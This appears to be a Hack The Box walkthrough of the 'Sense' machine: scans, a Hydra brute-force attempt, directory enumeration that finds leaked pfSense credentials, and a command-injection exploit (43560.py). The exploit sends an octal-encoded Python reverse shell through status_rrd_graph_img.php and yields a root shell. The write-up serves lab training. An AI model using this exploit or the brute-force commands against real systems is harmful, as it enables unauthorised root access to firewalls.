# Hack The Box - Sense Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sense]
└─$ sudo nmap -sC -sV -O -oN nmap/initial 10.10.10.60
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 02:05 EST
Nmap scan report for 10.10.10.60
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
443/tcp open  ssl/http lighttpd 1.4.35
|_ssl-date: TLS randomness does not represent time
|_http-title: Login
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-server-header: lighttpd/1.4.35
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: specialized
Running (JUST GUESSING): Comau embedded (92%)
Aggressive OS guesses: Comau C4G robot control unit (92%)
No exact OS matches for host (test conditions non-ideal).

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.75 seconds
                                                               
```

We get back the following result showing that 3 ports are open:
- Port `80`: running `lighttpd 1.4.35`.
- Port `443`: running `ssl/http lighttpd 1.4.35`.


Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Rustscan that covers all ports. The idea behind using `Rustscan` is that it is faster compared to Nmap since `Rustscan` using Multi-threading but doesnt have service, OS, script scan features. So, I basically used `Rustscan` to find open ports and If I find them, i'll only scan those ports for services, version & OS detection using Nmap, makiing it faster and much efficient.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sense]
└─$ rustscan -a 10.10.10.60 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.60:80
Open 10.10.10.60:443
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80,443 10.10.10.60

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 02:09 EST
Initiating Ping Scan at 02:09
Scanning 10.10.10.60 [2 ports]
Completed Ping Scan at 02:09, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:09
Completed Parallel DNS resolution of 1 host. at 02:09, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:09
Scanning 10.10.10.60 [2 ports]
Discovered open port 80/tcp on 10.10.10.60
Discovered open port 443/tcp on 10.10.10.60
Completed Connect Scan at 02:09, 0.12s elapsed (2 total ports)
Nmap scan report for 10.10.10.60
Host is up, received syn-ack (0.12s latency).
Scanned at 2023-01-20 02:09:27 EST for 1s

PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds

```

But `Rustscan` did not find any open ports.


## Enumeration
I visited `http://10.10.10.60` at port 80 and it redirected me to port `443`, so now I only had one port to enumerate.

![sen-1](https://user-images.githubusercontent.com/87711310/213641842-40b545ed-b745-4bcc-8096-4f1b2dff3bbc.png)

I got a `pfSense` login page. On googling it, i found out that `pfSense` is a free and open-source firewall and router. Since it is an off the shelf software, the first thing I did is google `pfsense default credentials` and found this.

![sen-2](https://user-images.githubusercontent.com/87711310/213642210-fb5b97d2-f308-42c6-ab6e-3485e490f846.png)

I tried `admin:pfsense` but that did not work. I also tried common credentials such as `admin:admin`, `pfsense:pfsense`, `admin:password`, etc.

When that didn’t work I tried to brute force the credentials using `Hydra` and used `Burp` to intercept the request and form the Hydra payload.

![sen-3](https://user-images.githubusercontent.com/87711310/213642717-3bb1785a-028c-482e-bf9c-6c1044cf31bd.png)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.60 https-post-form "/index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect"
```

This ended up getting me blocked. It wasn't very smart to brute-force the credentials of a firewall.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sense]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.60 https-post-form "/index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-20 02:08:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://10.10.10.60:443/index.php:__csrf_magic=sid%3A44c8728e26d47be027a7a01c98089e974f010329%2C1577594299&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect
[STATUS] 715.00 tries/min, 715 tries in 00:01h, 14343684 to do in 334:22h, 16 active
[STATUS] 714.00 tries/min, 2142 tries in 00:03h, 14342257 to do in 334:48h, 16 active
[STATUS] 713.29 tries/min, 4993 tries in 00:07h, 14339406 to do in 335:04h, 16 active
[STATUS] 714.00 tries/min, 10710 tries in 00:15h, 14333689 to do in 334:36h, 16 active
[STATUS] 608.19 tries/min, 18854 tries in 00:31h, 14325545 to do in 392:35h, 16 active
```

Next, I ran `gobuster` to enumerate directories

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k
```

I got back the following results
```
──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sense]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k            
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/20 02:09:28 Starting gobuster in directory enumeration mode
===============================================================
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]   
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]   
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]   
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]      
/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/] 
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/] 
/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]   
/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]      
/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]
/%7Echeckout%7E (Status: 403)
===============================================================
2023/01/20 02:13:29 Finished
===============================================================
```

I didn't get anything useful, so, I ran `searchsploit` to view if the software is associated with any vulnerabilites.

```
searchsploit pfsense
````

And I got a long list of vulns.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sense]
└─$ searchsploit pfsense
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pfSense - 'interfaces.php?if' Cross-Site Scripting                                                                        | hardware/remote/35071.txt
pfSense - 'pkg.php?xml' Cross-Site Scripting                                                                              | hardware/remote/35069.txt
pfSense - 'pkg_edit.php?id' Cross-Site Scripting                                                                          | hardware/remote/35068.txt
pfSense - 'status_graph.php?if' Cross-Site Scripting                                                                      | hardware/remote/35070.txt
pfSense - (Authenticated) Group Member Remote Command Execution (Metasploit)                                              | unix/remote/43193.rb
pfSense 2 Beta 4 - 'graph.php' Multiple Cross-Site Scripting Vulnerabilities                                              | php/remote/34985.txt
pfSense 2.0.1 - Cross-Site Scripting / Cross-Site Request Forgery / Remote Command Execution                              | php/webapps/23901.txt
pfSense 2.1 build 20130911-1816 - Directory Traversal                                                                     | php/webapps/31263.txt
pfSense 2.2 - Multiple Vulnerabilities                                                                                    | php/webapps/36506.txt
pfSense 2.2.5 - Directory Traversal                                                                                       | php/webapps/39038.txt
pfSense 2.3.1_1 - Command Execution                                                                                       | php/webapps/43128.txt
pfSense 2.3.2 - Cross-Site Scripting / Cross-Site Request Forgery                                                         | php/webapps/41501.txt
Pfsense 2.3.4 / 2.4.4-p3 - Remote Code Injection                                                                          | php/webapps/47413.py
pfSense 2.4.1 - Cross-Site Request Forgery Error Page Clickjacking (Metasploit)                                           | php/remote/43341.rb
pfSense 2.4.4-p1 (HAProxy Package 0.59_14) - Persistent Cross-Site Scripting                                              | php/webapps/46538.txt
pfSense 2.4.4-p1 - Cross-Site Scripting                                                                                   | multiple/webapps/46316.txt
pfSense 2.4.4-p3 (ACME Package 0.59_14) - Persistent Cross-Site Scripting                                                 | php/webapps/46936.txt
pfSense 2.4.4-P3 - 'User Manager' Persistent Cross-Site Scripting                                                         | freebsd/webapps/48300.txt
pfSense 2.4.4-p3 - Cross-Site Request Forgery                                                                             | php/webapps/48714.txt
pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                            | php/webapps/43560.py
pfSense Community Edition 2.2.6 - Multiple Vulnerabilities                                                                | php/webapps/39709.txt
pfSense Firewall 2.2.5 - Config File Cross-Site Request Forgery                                                           | php/webapps/39306.html
pfSense Firewall 2.2.6 - Services Cross-Site Request Forgery                                                              | php/webapps/39695.txt
pfSense UTM Platform 2.0.1 - Cross-Site Scripting                                                                         | freebsd/webapps/24439.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```


But nothing really pops up. Since most of the exploits require authentication, I tried enumeration files using `gobuster` with extensions, `php`, `conf`, etc.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x php,txt,conf
```

And I got back few interesting results

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Sense]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x php,txt,conf
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.60
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,conf
[+] Timeout:                 10s
===============================================================
2023/01/20 02:10:03 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 6690]
/help.php             (Status: 200) [Size: 6689]
/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]
/stats.php            (Status: 200) [Size: 6690]                               
/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]   
/edit.php             (Status: 200) [Size: 6689]                               
/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]
/license.php          (Status: 200) [Size: 6692]                                 
/system.php           (Status: 200) [Size: 6691]                                 
/status.php           (Status: 200) [Size: 6691]                                 
/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]
/changelog.txt        (Status: 200) [Size: 271]                                    
/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]   
/exec.php             (Status: 200) [Size: 6689]                                   
/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]   
/graph.php            (Status: 200) [Size: 6690]                                   
/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]      
/wizard.php           (Status: 200) [Size: 6691]                                   
/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/] 
/pkg.php              (Status: 200) [Size: 6688]                                   
/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/] 
/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]   
/xmlrpc.php           (Status: 200) [Size: 384]                                    
/reboot.php           (Status: 200) [Size: 6691] 
/interfaces.php       (Status: 200)
/csrf                 (Status: 301)
/system-users.txt     (Status: 200)
/filebrowser          (Status: 301)
/%7Echeckout%7E       (Status: 403)
```

Two files caught my attention: `changelog.txt` & `system-users.txt`

![sen-4](https://user-images.githubusercontent.com/87711310/213643936-f3bb07da-a81a-4056-af4c-9f8b7423134e.png)

The `changelog.txt` file confirmed that they're definitely using a vulnerable version of pfSense.

The `system-users.txt` file gave us credentails to the login form (rohit:pfsense)

![sen-5](https://user-images.githubusercontent.com/87711310/213643940-59d687c5-397b-4a16-ab08-58a9a38bae22.png)

Visiting the dashboard, I saw the version of the pfSense is 2.1.3.

![sen-6](https://user-images.githubusercontent.com/87711310/213644295-e07b9197-06c3-4054-b99a-eb190496a1f8.png)

And going back to the searchsploit results, one exploit stood out.

![sen-7](https://user-images.githubusercontent.com/87711310/213644609-8dbfb371-675c-4552-81b6-33c60f02971e.png)

## Exploitation
Transferred the exploit to my directory.

```
searchsploit -m 43560.py
```

Looking at the exploit to understand what it does.
```python
.....# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"
......
```

It seems that the `status_rrd_graph_img.php` script is vulnerable to a `command injection`. To exploit that, the script is passing a simple python reverse shell as a command.

It does `octal encode` the reverse shell command which leads me to believe that there is either some form of filtering being done at the backend or the application crashes on certain characters. To sum up, it’s a very simple script that sends a reverse shell back to our attack machine.

So, I turned up a listener to receive the shell
```
nc -lvnp 1234
```

Then ran the exploit
```
python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.6 --lport 1234 --username rohit --password pfsense
```

And I got the shell
```
┌──(darshan㉿kali)-[~]
└─$ nc -lvnp 1234   
listening on [any] 1234 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.60] 13044
sh: can't access tty; job control turned off
# whoami
root
```

For this machine, there was no need to escalate peivileges since pfSense is running as a root and therefore when we exploited the command injection vulnerability we got a shell with root privileges.

Retreiving the `user.txt` and `root.txt`
```
# ls        
GW_WAN-quality.rrd
WAN_DHCP-quality.rrd
ipsec-packets.rrd
ipsec-traffic.rrd
system-mbuf.rrd
system-memory.rrd
system-processor.rrd
system-states.rrd
updaterrd.sh
wan-packets.rrd
wan-traffic.rrd
# cd /home
# ls
.snap
rohit
# cd rohit
# ls
.tcshrc
user.txt
# cat user.txt
[REDACTED]
# cd /root
# ls
.cshrc
.first_time
.gitsync_merge.sample
.hushlogin
.login
.part_mount
.profile
.shrc
.tcshrc
root.txt
# cat root.txt
[REDACTED]

```
